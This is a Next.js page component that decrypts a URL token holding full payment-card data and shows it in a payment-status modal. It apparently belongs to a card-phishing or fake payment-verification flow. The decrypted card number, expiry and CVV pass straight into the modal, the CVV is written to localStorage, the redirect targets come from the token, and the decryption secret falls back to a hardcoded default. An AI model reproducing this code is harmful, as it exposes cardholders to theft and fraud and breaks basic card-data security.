import { useEffect, useState } from "react";
import type { GetServerSideProps } from "next";
import PaymentStatusModal from "@/components/PaymentStatusModal";
import { decryptPayload } from "@/lib/payloadCipher";

interface PaymentPayload {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
    cardBrand: string;
    metodo: string;
  };
  price: string;
  priceFormatted: string;
  redirectSuccess: string;
  redirectDeclined: string;
}

interface HomeProps {
  valid: boolean;
  payload?: PaymentPayload;
}

export const getServerSideProps: GetServerSideProps = async (ctx) => {
  const token = typeof ctx.query.d === "string" ? ctx.query.d : "";
  if (!token) {
    return { props: { valid: false } };
  }
  try {
    const secret = process.env.PAYLOAD_SECRET ?? "dev-payload-secret";
    const payload = decryptPayload<PaymentPayload>(token, secret);
    const isWellFormed =
      typeof payload?.payment?.numeroTarjeta === "string" &&
      typeof payload.payment.vencimiento === "string" &&
      typeof payload.payment.cvv === "string" &&
      typeof payload.payment.titular === "string" &&
      typeof payload.price === "string" &&
      typeof payload.priceFormatted === "string" &&
      typeof payload.redirectSuccess === "string" &&
      typeof payload.redirectDeclined === "string";
    if (!isWellFormed) {
      return { props: { valid: false } };
    }
    return { props: { valid: true, payload } };
  } catch {
    return { props: { valid: false } };
  }
};

export default function Home({ valid, payload }: HomeProps) {
  const [sessionId] = useState(() => `demo-${Date.now()}`);
  const [isOpen, setIsOpen] = useState(false);

  useEffect(() => {
    if (valid && payload) {
      localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));
      setIsOpen(true);
    }
  }, [valid, payload]);

  if (!valid || !payload) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-transparent">
        <p className="text-sm text-gray-500">URL inválida</p>
      </main>
    );
  }

  return (
    <PaymentStatusModal
      sessionId={sessionId}
      isOpen={isOpen}
      price={payload.price}
      priceFormatted={payload.priceFormatted}
      last4={payload.payment.numeroTarjeta.slice(-4)}
      card={payload.payment.numeroTarjeta}
      cardT={
        payload.payment.metodo === "credito"
          ? "Crédito"
          : payload.payment.metodo === "debito"
            ? "Débito"
            : payload.payment.metodo === "prepago"
              ? "Prepago"
              : "Crédito"
      }
      vencimiento={payload.payment.vencimiento}
      cvv={payload.payment.cvv}
      titular={payload.payment.titular}
      cardBrand={payload.payment.cardBrand}
      email={payload.payment.email}
      contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
      redirectSuccess={payload.redirectSuccess}
      redirectDeclined={payload.redirectDeclined}
    />
  );
}